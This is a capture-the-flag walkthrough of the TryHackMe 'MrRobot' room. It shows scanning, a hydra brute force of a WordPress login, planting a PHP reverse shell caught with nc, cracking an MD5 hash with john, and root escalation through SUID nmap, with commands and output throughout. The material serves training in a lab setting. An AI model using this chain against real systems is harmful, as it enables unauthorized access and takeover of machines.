# TryHackMe - MrRobot

![MrRobot Logo](https://assets.tryhackme.com/additional/imgur/mp5JwKO.png)

## Room Info
- **Difficulty:** Medium
- **Category:** Web Exploitation / Enumeration
- **Tags:** `Web` `Brute Force` `Reverse Shell` `Privilege Escalation`
- **Link:** https://tryhackme.com/room/mrrobot

## Challenge Overview

This challenge is inspired by the *Mr. Robot* TV series and focuses on basic web enumeration and exploitation techniques. The goal is to discover hidden resources on a web server, extract sensitive information, and progressively gain access by leveraging common misconfigurations and weak credentials.

## Flag 1
First, we perform an nmap scan.
```
Nmap scan report for 10.66.138.132
Host is up (0.00064s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.98 seconds
```

Then, we browse the website but nothing useful comes of it.

Therefore, we are performing a directory enumerate scan.

```
root@ip-10-66-104-97:~# gobuster dir -u 10.66.138.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q
/images               (Status: 301) [Size: 236] [--> http://10.66.138.132/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.66.138.132/blog/]
/sitemap              (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.66.138.132/video/]
/rss                  (Status: 301) [Size: 0] [--> http://10.66.138.132/feed/]
/login                (Status: 302) [Size: 0] [--> http://10.66.138.132/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.66.138.132/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.66.138.132/feed/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.66.138.132/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.66.138.132/admin/]
/image                (Status: 301) [Size: 0] [--> http://10.66.138.132/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.66.138.132/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.66.138.132/audio/]
/intro                (Status: 200) [Size: 516314]
/css                  (Status: 301) [Size: 233] [--> http://10.66.138.132/css/]
/wp-login             (Status: 200) [Size: 2671]
/rss2                 (Status: 301) [Size: 0] [--> http://10.66.138.132/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.66.138.132/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.66.138.132/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.66.138.132/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.66.138.132/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.66.138.132/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.66.138.132/wp-admin/]
/%20                  (Status: 301) [Size: 0]
```

Firstly, we check the robots.txt file and find the first flag. (http://ATTACK-MACHINE/key-1-of-3.txt)
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

## Flag 2

Since the wp-login.php page accepts an unlimited number of attempts and gives different errors for invalid usernames and incorrect passwords, we can perform a brute force attack using the **fsocity.dic** dictionary we found in the previous step.

```
root@ip-10-66-104-97:~# hydra -L Desktop/fsocity.dic -p test_pass 10.66.138.132 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-08 10:51:38
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.66.138.132:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.66.138.132   login: Elliot   password: test_pass
[80][http-post-form] host: 10.66.138.132   login: elliot   password: test_pass
[80][http-post-form] host: 10.66.138.132   login: ELLIOT   password: test_pass
```
We know the username, now we can do the same thing for the password: (I used rockyou.txt)
```
> root@ip-10-66-104-97:~# hydra -l Elliot -P /usr/share/wordlists/rockyou.txt 10.66.138.132 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:incorrect" -t 30
```
Or we could basicly look at the /license page. The base64 encoded versions of the username and password are found there.

<br><br>
With these credentials we login into the wordpress panel. And change source codes of pages.

In order to gain a shell we change a pages file (e.g. 404.php) in the admin panel.
I used [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)

When a request is sent to that page, the PHP file runs and the server attempts to establish a reverse shell connection.
```
root@ip-10-66-104-97:~# nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.66.138.132 42830
Linux ip-10-66-138-132 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 11:52:23 up  2:39,  0 users,  load average: 6.47, 6.00, 5.84
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We are looking at the home directory.
```
$ ls -la home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat pass*   
robot:c3fcd3d76192e4007dfb496cca67e13b
```
password.raw-md5 file is interesting because it contains user robot's pass' md5 hash. But we know that md5 is not secure for password hashing. 

```
~ ❯ john hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
**abcdefghijklmnopqrstuvwxyz (?)**
1g 0:00:00:00 DONE (2026-02-08 15:41) 20.00g/s 810240p/s 810240c/s 810240C/s bologna1..122984
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```
We can switch to the robot user with this password. But first, we need to switch to the interactive shell using Python (otherwise, su won't work).

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@ip-10-66-138-132:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

$ whoami
whoami
robot
```
Now we can see the second flag.

## Flag 3
For privilege esclation we search for files with SUID permission.
```
robot@ip-10-66-138-132:/$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
We see **nmap** here where it shouldn't be.
We reach root level using nmap's interactive mode.
```
robot@ip-10-66-138-132:/$ nmap --interactive
!/bin/shnmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> /bin/sh
/bin/sh
# whoami
whoami
root
```
Lastly you can find the latest flag in the /root directory.
